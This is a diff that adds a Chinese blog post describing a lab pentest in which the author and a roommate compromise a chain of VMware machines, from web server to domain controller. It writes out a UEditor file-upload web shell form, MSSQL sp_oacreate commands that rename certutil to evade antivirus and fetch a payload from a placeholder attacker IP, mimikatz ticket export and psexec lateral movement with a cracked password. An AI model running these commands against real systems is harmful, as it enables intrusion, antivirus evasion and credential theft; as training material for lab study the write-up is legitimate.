@@ -71,6 +71,111 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-和室友艰辛的一次打靶记录" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/04/08/%E5%92%8C%E5%AE%A4%E5%8F%8B%E8%89%B0%E8%BE%9B%E7%9A%84%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" class="article-date">
+  <time class="dt-published" datetime="2022-04-08T03:22:40.262Z" itemprop="datePublished">2022-04-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="和室友艰辛的一次打靶记录"><a href="#和室友艰辛的一次打靶记录" class="headerlink" title="和室友艰辛的一次打靶记录"></a>和室友艰辛的一次打靶记录</h1><p>之前室友找到了个非常好的靶场，说和我一起打。我们用了四天时间，经历了巨多磨难，总算是让所有机器全部上线（这其中大部分都是我室友打下来的，我有点像个混子一样。。。），由于大部分是舍友打下来的，所以这里我从头到尾复现一下，也顺便把踩过的坑记录一下。</p>
+<h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><p>所有机子都是搭在舍友的电脑上的vmware上的。他用一个内网穿透把web1的入口映射到了他的服务器上。这里直接访问他给的网站即可。</p>
+<p><img src="/Users/shihiroshisakai/Downloads/20220330161905.png" alt="20220330161905"></p>
+<p>是个cms，这个页面上的登陆和注册就是俩摆设，没啥用。所以这边直接dirsearch扫描</p>
+<p><img src="/Users/shihiroshisakai/Downloads/20220330143737.png" alt="20220330143737"></p>
+<p>这里看到了一个admin&#x2F;login.aspx。直接访问，会弹出来一个后台管理登陆注册界面，而且admin显示已经让注册过了。手动sql注入一番失败后，我直接自己注册了一个管理员登陆了上去。</p>
+<p><img src="/Users/shihiroshisakai/Downloads/20220330161828.png" alt="20220330161828"></p>
+<p>然后就有了现在这个界面。到了这里舍友一眼就看中了百度Ueditor,而我把目光放在了模版上面（嗯。。。最后shell是舍友的方法拿下的。。。）模版这块由于原来的模版只有html、css和js文件，所以无法直接写马。添加模版需要admin账户的权限。所以这里用sqlmap尝试注入，虽然能注，但速度很慢。这时候舍友在网上找到了源码，这种cms的数据库信息一般都是写死在源码中的，所以我们能通过源码拿到数据库表名字段名等一些信息。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105754.png" alt="image-20220330090053912"></p>
+<p>在这个配置文件中找到了数据库文件HdhCms.mdb。用office打开</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105757.png" alt="image-20220330090117660"></p>
+<p>找到了数据库中含有admin用户的表名和对应的字段名。然后sqlmap跑出了结果。有了admin用户，我们就可以增加配置文件了。然而配置文件有白名单过滤。基本所有方法都试了也不行。与此同时舍友用打Ueditor的方法拿下了web1。</p>
+<p>在服务器上上传一个html文件：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://www.ackmoon.com/admin/net/controller.ashx?action=catchimage&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;source[]&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>浏览器访问会有这样的界面</p>
+<p>![截屏2022-03-30 下午5.26.10](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;截屏2022-03-30 下午5.26.10.png)</p>
+<p>然后在服务器上上传一张图片马，其实直接把写好的aspx木马后缀改为.jpg就行了（这里只让传图片）。然后把图片路径写入文本框中上传。</p>
+<p><img src="/Users/shihiroshisakai/Downloads/20220330151830.png" alt="20220330151830"></p>
+<p>看到这里就代表上传成功了，直接蚁剑连就行了。</p>
+<p>但这里注意一下我们服务器上的文件是ice.jpg,而我们上传的文件名为ice.jpg?.aspx,这里用到了一个解析漏洞，web1来我们服务器上取文件时，并不能解析?及后面的内容，所以它取走的是ice.jpg,但在web的IIS服务器上存放时却解析了后面的aspx。</p>
+<p><img src="/Users/shihiroshisakai/Downloads/20220330152505.png" alt="20220330152505"></p>
+<p>接下来要想办法让web1上线msf或CS，这里我们传上去的可执行文件都让杀软给杀了。我弄了很多的免杀也没有逃掉360和火绒的法眼。但我舍友用msf生成了编码后的aspx文件绕过了杀软的检测，后来我试了一下，貌似aspx文件不用编码也不会被杀。</p>
+<p>生成aspx把流量反弹到服务器的1234端口，再使用frp，把服务器上1234端口的流量转发到kali的4444端口。</p>
+<p><img src="/Users/shihiroshisakai/Downloads/20220330154903.png" alt="20220330154903"></p>
+<p>这里看到web1上线msf了。</p>
+<h2 id="DATA1"><a href="#DATA1" class="headerlink" title="DATA1"></a>DATA1</h2><p>到了这个时候要按道理是要扫描的。但是在蚁剑中我们找到了它的HdhApp.config。</p>
+<p>![截屏2022-03-30 下午7.31.07](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Desktop&#x2F;截屏2022-03-30 下午7.31.07.png)</p>
+<p>在这里我们可以很清楚的看到数据库账户密码以及数据库服务器的ip。我舍友从网上找了一个能连接数据库的aspx大马。</p>
+<p><img src="/Users/shihiroshisakai/Downloads/20220330195325.png" alt="20220330195325"></p>
+<p>我们可以直接成功连接，这里使用tasklist &#x2F;SVC命令，导出的结果可以直接拿去在线杀软识别工具识别杀软。</p>
+<p><img src="/Users/shihiroshisakai/Downloads/20220330195342.png" alt="20220330195342"></p>
+<p>结果发现data1这台机子并没有360，只有火绒。于是有了这样一个思路，之前所有传上去的面杀，有360杀掉的，也有火绒杀掉的，那么这次我们只要传上去之前试过的360杀掉的而火绒杀不掉的木马应该就可以了。所以在我的要求下，我们看了web1中杀软被杀的具体情况。 </p>
+<p>嗯。。。大概看了一下，感觉都是360杀的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105832.jpg" alt="E3B51E067B2366D67635BC9838C3B0C2"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/03/20220330105839.jpg" alt="40C990A590B7A5066AF38F27984D7FCC"></p>
+<p>但我细心的舍友发现这里有两种情况，一种是木马上传后立即被杀掉，就和第一张图一样。而在第二张图中，当时我传上去了一个加载器和一个二进制文件，这两个是肯定不会被杀软杀掉的。但是我用加载器把二进制文件加载成可执行文件并注入内存时系统报了错，360这里检测到了这个行为并阻止了。</p>
+<p>那么在没有360的data2中，我们用加载器的方法应该就没问题了。</p>
+<p>这里需要把加载器和CS生成的二进制文件传到data2中。这里我们用certutil从远程服务器上下载。但是失败了，原因大概是火绒对本地certutil有限制。所以这里我们选择把certutil从System32下移位并重命名绕过检测。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;  RECONFIGURE;  exec sp_configure &#x27;Ole Automation Procedures&#x27;, 1;  RECONFIGURE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">利用sp_oacreate构造语句，将certutil.exe复制到c:\windows\temp\下，并重命名为cerice.exe：</span><br><span class="line">declare @o int exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;C:\Windows\System32\certutil.exe&#x27; ,&#x27;c:\windows\temp\cerice.exe&#x27;;</span><br><span class="line"></span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\Temp\cerice.exe -urlcache -split -f &quot;http://your_ip:20022/HanzoInjection.exe&quot; C:\Users\MSSQLSERVER\hanzo.exe&#x27;</span><br><span class="line"></span><br><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\Temp\cerice.exe -urlcache -split -f &quot;http://your ip/payload.bin&quot; C:\Users\MSSQLSERVER\payload.bin&#x27;</span><br><span class="line"></span><br><span class="line">Exec master.dbo.xp_cmdshell &#x27;cd C:\Users\MSSQLSERVER\ &amp;&amp; hanzo.exe -e payload.bin&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>CS成功上线</p>
+<p><img src="/Users/shihiroshisakai/Downloads/20220330212038.png" alt="20220330212038"></p>
+<p>然后我们看一下网卡信息</p>
+<p><img src="/Users/shihiroshisakai/Downloads/20220330213444.png" alt="20220330213444"></p>
+<p>紧接着用CS自带的扫描器对22网段做个扫描</p>
+<p><img src="/Users/shihiroshisakai/Downloads/20220330213411.png" alt="20220330213411"></p>
+<h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p>那么该网段剩下的就还有192.168.22.149这台机子没有拿到了。在这次扫描中，发现149的80端口是开着的，于是我们挂上CS的代理直接访问。</p>
+<p>![截屏2022-03-30 下午11.56.19](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;截屏2022-03-30 下午11.56.19.png)</p>
+<p>![截屏2022-03-30 下午10.07.03](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Desktop&#x2F;截屏2022-03-30 下午10.07.03.png)</p>
+<p>我们成功得到一个登陆界面，并且在用他给的用户名密码登录后抓到了一个jwt，于是到这里我满怀欣喜的去爆破了。最后也的确爆破出了结果</p>
+<p>![截屏2022-03-28 上午10.00.29](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Desktop&#x2F;截屏2022-03-28 上午10.00.29.png)</p>
+<p>然而就在这个时候，我的舍友发现了些了不起的东西。他通过目录扫描找到了一个名为a.php的文件，我们访问这个文件</p>
+<p>前面是一些sql的日志信息，后面跟了个phpinfo。</p>
+<p>![截屏2022-03-31 上午12.01.59](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;截屏2022-03-31 上午12.01.59.png)</p>
+<p>但最后这个东西就让人有点不淡定了，这貌似就是一个一句话木马没参数报的错。这里我们直接给蚁剑挂代理打。</p>
+<p>![截屏2022-03-30 下午10.24.07](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Desktop&#x2F;截屏2022-03-30 下午10.24.07.png)</p>
+<p>然后居然真成功了。直接上线CS，这里以data1为跳板再起一个监听器</p>
+<p><img src="/Users/shihiroshisakai/Downloads/20220330224350.png" alt="20220330224350"></p>
+<p>然后生成一个可执行文件上传到web2中运行</p>
+<p><img src="/Users/shihiroshisakai/Downloads/20220330224438.png" alt="20220330224438"></p>
+<h2 id="DC1"><a href="#DC1" class="headerlink" title="DC1"></a>DC1</h2><p>其实到了这里我们已经打进域内了</p>
+<p>![截屏2022-03-31 上午12.16.21](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;截屏2022-03-31 上午12.16.21.png)</p>
+<p>后面就是我最喜欢的环节了，直接mimi抓密码。嗯。。。抓了个寂寞，明文一个没抓到不说，连个管理员的hash都没有，即没法ipc远程连接，也没法hash传递。一怒之下，我看都没看直接导出了所有票据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::list /export</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Users/shihiroshisakai/Downloads/20220330225238.png" alt="20220330225238"></p>
+<p>还真不少，由于这里的票据是TGS返回的票据，里面包含服务ntlm加密的session_key值，所以我们只要找到服务是域控的，抓到的就可能是域管的hash了。这里有不少，我们随便抓一个下来爆破。</p>
+<p><img src="/Users/shihiroshisakai/Downloads/20220328233414.png" alt="20220328233414"></p>
+<p>这里爆破出了一个明文密码。就像之前说的一样，由于我选取的票据服务端是域控，所以盲猜这个就是域管的密码。</p>
+<p>那么就用一下psexec试试吧,首先建立一个smb监听![截屏2022-04-08 上午11.06.46](&#x2F;Users&#x2F;shihiroshisakai&#x2F;Library&#x2F;Application Support&#x2F;typora-user-images&#x2F;截屏2022-04-08 上午11.06.46.png)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\16SEREVR-DC1\ipc$ &quot;P@55w0rd!&quot; /user:&quot;Administrator&quot;   </span><br><span class="line">jump psexec 16SEREVR-DC1 smb   //smb是我们之前建立的监听器的名字</span><br></pre></td></tr></table></figure>
+
+<p>然后就成功了（这里截图丢了，环境也不好重开，见谅。。。）。</p>
+<h2 id="DATA2"><a href="#DATA2" class="headerlink" title="DATA2"></a>DATA2</h2><p>域控都到手了我还怕个DATA2？我一开始是这么想的，但是事实证明我错了，我用打域控的方法打了一下DATA2，虽然ipc连接能够成功建立，但是psexec却不能成功执行。后来耽误了很长时间，我舍友用CS自带的psexec给拿下了，我看了一下，CS自带的psexec和我之前的打法的确不同，我是先建立ipc连接，然后上传psexec并运行，而它是先制作了个管理员的令牌并注入内存后再上传psexec并运行的，说实话到现在我也不知道为啥效果会不一样，等以后研究明白后我会把这段补上的。。。</p>
+<p>纪念一下：</p>
+<p><img src="/Users/shihiroshisakai/Downloads/Cache_d7190aefe1187f6.jpg" alt="Cache_d7190aefe1187f6"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/04/08/%E5%92%8C%E5%AE%A4%E5%8F%8B%E8%89%B0%E8%BE%9B%E7%9A%84%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" data-id="cl1px9cg30000o4u859079srm" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-记一次靶场练习-VulnStack-4" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-VulnStack-4/" class="article-date">
@@ -316,6 +421,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2022/04/08/%E5%92%8C%E5%AE%A4%E5%8F%8B%E8%89%B0%E8%BE%9B%E7%9A%84%E4%B8%80%E6%AC%A1%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/">(no title)</a>
+          </li>
         
           <li>
             <a href="/2022/04/08/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0-VulnStack-4/">(no title)</a>
